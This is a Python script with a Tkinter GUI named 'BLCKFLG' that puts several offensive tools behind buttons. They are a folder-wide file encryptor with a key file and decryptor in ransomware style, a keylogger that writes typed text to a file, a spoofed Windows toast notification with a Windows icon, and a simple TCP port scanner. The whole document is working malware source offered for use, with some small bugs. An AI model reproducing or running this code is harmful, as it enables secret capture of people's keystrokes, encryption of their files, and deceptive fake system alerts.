from win10toast import ToastNotifier
from cryptography.fernet import Fernet
from tkinter import ttk
from tkinter import *
import keyboard
import socket 
import os


'''
Creates a GUI interface
'''
m = Tk()
m.title('BLCKFLG')
m['bg'] = 'black'
m.geometry('400x400+500+100')
        
'''
Encryption Function
'''
def Encryption():
    random_key = Fernet.generate_key()
    
    folder_path = 'C:\\Test Folder'
    
    new_window('files Succesfully Encrypted')

    with open('thekey.key', 'wb') as thekey:
        thekey.write(random_key)

    for file in os.listdir(folder_path):
        file_path = os.path.join(folder_path, file)

        with open(file_path, 'rb') as thefile:
            contents = thefile.read()
            
        encrypted_contents = Fernet(random_key).encrypt(contents)

        with open(file_path, 'wb') as thefile:
            thefile.write(encrypted_contents)

'''
Decryption Function
'''
def Decryption(key_file = 'thekey.key'):
    
    folder_path = 'C:\\Test Folder'

    new_window('files Succesfully Decrypted')

    with open(key_file, 'rb') as key_file:
        key = key_file.read()

    for file in os.listdir(folder_path):
        file_path = os.path.join(folder_path, file)

        with open(file_path, 'rb') as thefile:
            contents = thefile.read()

        decrypted_contents = Fernet(key).decrypt(contents)

        with open(file_path, 'wb') as thefile:
            thefile.write(decrypted_contents)
    

'''
A Simple Keylogger
'''
def Keylogger():
            
    flag = 0
            
    while flag == 0:
        letters = keyboard.record()
        typed = list(keyboard.get_typed_strings(letters))
                
        file = open('E:\\keylogger.txt','a')
        file.write(typed[0])
        file.close
        if keyboard.is_pressed('escape'):
            flag += 1


'''
These Next three functions make a fake notification
'''

def Noti(Title,Body):
    toast = ToastNotifier()
    toast.show_toast(
    f"{Title}",
    f"{Body}",
    duration = 10,
    icon_path = "windows.ico",
    threaded = True,
)
    
def Notiweb():
    win= Tk()
    win.title('Things To Say')
    win['bg'] = 'black'
    win.geometry("750x250")
        
    
    entry= Entry(win, width= 40)
    entry.pack()

    entry2= Entry(win, width= 40)
    entry2.pack()
    
    def change_value():
       value = 1
       value -= 1
       if value == 0:
            string = entry.get()
            Body = entry2.get()
            Noti(string,Body)
            value = 1

    ttk.Button(win, text= "confirm",width= 20, command= change_value).pack(pady=20)
    
    win.mainloop()
    
'''
Port Scanners
'''

def PortGet():
    win= Tk()
    win.title('Details')
    win['bg'] = 'black'
    win.geometry("750x250")
    
    entry= Entry(win, width= 40)
    entry.pack()

    entry2= Entry(win, width= 40)
    entry2.pack()
    
    entry3 = Entry(win, width = 40)
    entry3.pack()
    
    def change_value():
       value = 1
       value -= 1
       if value == 0:
            target = entry.get()
            port1 = entry2.get()
            port2 = entry3.get()
            PortScanner(target,int(port1),int(port2))
            value = 1

    ttk.Button(win, text= "confirm",width= 20, command= change_value).pack(pady=20)
    
def is_port_open(host, port):
    s = socket.socket()
    try:
        s.connect((host, port))
        s.timeout(0.2)
    except:
        return False
    else:
        return True

def PortScanner(target,port1,port2):

    for port in range(port1,port2):
        
        if is_port_open(target,port):
            
            print(f'{target}:{port} is open')
            
        else:
            print(f'{target}:{port} is closed')

#
#-----------------------GUI FOR SCRIPTS--------------------------------------
#

def openfile():
    f = open('E:\\keylogger.txt','r')
    read = f.read()
    nwp = Toplevel(m)
    nwp.title('Keylogs')
    nwp['bg'] = 'black'
    nwp.geometry('1080x540')
    Label(nwp, text=str(read),font=('Ariel 15 bold')).pack(pady=30)    
    f.close()
    
def new_window(textstring):
    nwp = Toplevel(m)
    nwp.title('Key')
    nwp['bg'] = 'black'
    nwp.geometry('540x540')
    Label(nwp, text=str(textstring),font=('Ariel 15 bold')).pack(pady=30)
    
def you_thought():
    new_window('You are not Encrypting Files')
    
#---------------GUI BUTTONS--------------------------------------

#Keylogger Button
button1 = Button(m,text = 'Keylogger', command = Keylogger)
button1.pack()

#Keylogger file button
button2 = Button(m, text = 'Open Keylogs', command = openfile)
button2.pack()
          
#Decryption button          
button3 = Button(m,text= 'Decryptor', command = Decryption)
button3.pack(side = 'bottom')    
       
#Encryption button
button4 = Button(m, text = 'Encryptor', command = Encryption)
button4.pack(side = 'bottom')

#Fake Notification Button
button5 = Button(m, text = 'Fake Notification', command = Notiweb)
button5.pack(side = 'left')

button6 = Button(m, text = 'Port Scanner', command = PortGet)
button6.pack(side = 'right')

m.mainloop()